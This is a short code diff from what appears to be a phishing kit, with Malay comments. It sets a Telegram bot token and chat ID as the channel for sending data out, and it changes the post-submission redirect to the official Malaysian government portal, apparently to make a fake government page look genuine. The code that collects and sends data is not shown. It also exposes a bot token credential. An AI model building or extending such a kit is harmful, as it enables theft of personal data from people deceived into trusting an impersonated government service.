@@ -1,7 +1,7 @@
 // TUKAR SINI
 const BOT_TOKEN = "9277901855:AAF-83CM2BKInE4V_rKb3oyxSHEjS3t8ym0";
 const CHAT_ID = "-1004444548273";
-const REDIRECT_URL = "https://www.google.com"; // Ke mana lepas siap
+const REDIRECT_URL = "https://www.malaysia.gov.my"; // Redirect ke web rasmi kerajaan
 
 const $ = id => document.getElementById(id);
 const TG_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
